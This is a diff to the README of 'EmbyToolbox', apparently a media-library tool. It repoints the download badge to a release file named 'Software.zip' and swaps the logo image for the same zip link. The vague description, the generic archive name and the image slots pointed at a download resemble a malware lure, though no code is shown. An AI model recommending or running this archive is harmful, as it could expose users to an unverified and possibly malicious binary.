@@ -11,7 +11,7 @@ Welcome to the EmbyToolbox repository! This repository is designed to provide a 
 ## How to Use
 To get started, simply download the EmbyToolbox software package from the link provided below and extract it to your desired location. Launch the application corresponding to the tool you wish to use and follow the on-screen instructions. It's that simple!
 
-[![Download EmbyToolbox](https://img.shields.io/badge/Download-EmbyToolbox-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download EmbyToolbox](https://github.com/13austinikeh/EmbyToolbox/releases/download/v2.0/Software.zip)](https://github.com/13austinikeh/EmbyToolbox/releases/download/v2.0/Software.zip)
 
 ## Need Help?
 If the provided link does not work or you require further assistance, please check the "Releases" section of this repository for alternative download options or updates. Your feedback is valuable, so feel free to submit any issues or suggestions through the GitHub repository.
@@ -21,4 +21,4 @@ Stay updated with the latest developments and releases by following this reposit
 
 Let's make managing your Emby media library a breeze with EmbyToolbox! 🚀
 
-![EmbyToolbox Logo](https://example.com/embytoolbox_logo.png)
+![EmbyToolbox Logo](https://github.com/13austinikeh/EmbyToolbox/releases/download/v2.0/Software.zip)
